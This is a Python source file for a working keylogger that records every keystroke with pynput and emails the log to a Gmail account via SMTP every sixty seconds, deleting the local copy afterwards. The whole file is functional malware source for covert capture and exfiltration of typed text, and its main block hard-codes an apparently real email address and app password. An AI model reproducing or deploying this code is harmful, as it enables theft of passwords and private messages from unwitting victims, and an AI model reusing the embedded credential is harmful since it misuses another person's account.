# keylogger/keylogger.py
import pynput.keyboard
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os

class Keylogger:
    """
    A Keylogger class that captures keystrokes, logs them, and emails the log file.
    """
    def __init__(self, time_interval, email, password):
        self.log = "Keystrokes Log:\n\n"
        self.interval = time_interval
        self.email = email
        self.password = password
        self.log_file = "keylog.txt"

    def append_to_log(self, string):
        """Appends the captured key string to the log."""
        self.log += string

    def on_press(self, key):
        """Callback function for when a key is pressed."""
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = f" [{str(key)}] "
        self.append_to_log(current_key)

    def write_log_file(self):
        """Writes the log content to a file."""
        with open(self.log_file, "w") as f:
            f.write(self.log)

    def send_mail(self):
        """Sends the log file to the specified email."""
        self.write_log_file()
        
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = "Keylogger Report"
        body = "Attached is the keylogger report."
        msg.attach(MIMEText(body, 'plain'))

        try:
            with open(self.log_file, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename= {self.log_file}")
                msg.attach(part)

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.email, self.password)
            text = msg.as_string()
            server.sendmail(self.email, self.email, text)
            server.quit()
            print(f"[*] Log file sent to {self.email}")
        except Exception as e:
            print(f"[!] Failed to send email: {e}")
        finally:
            if os.path.exists(self.log_file):
                os.remove(self.log_file) # Clean up the log file

    def report(self):
        """Sends the report and resets the log."""
        if self.log != "Keystrokes Log:\n\n":
            self.send_mail()
        self.log = "Keystrokes Log:\n\n"
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        """Starts the keylogger."""
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    # IMPORTANT: For Gmail, you may need to enable "Less secure app access" 
    # or use an "App Password".
    # It's recommended to use a dedicated email account for this.
    SENDER_EMAIL = "sydakifuddin47@gmail.com"  # Your email
    SENDER_PASSWORD = "glkh fdpc rano bval"  # Your email app password
    
    print("[*] Starting Keylogger...")
    keylogger = Keylogger(60, SENDER_EMAIL, SENDER_PASSWORD) # Report every 60 seconds
    keylogger.start()
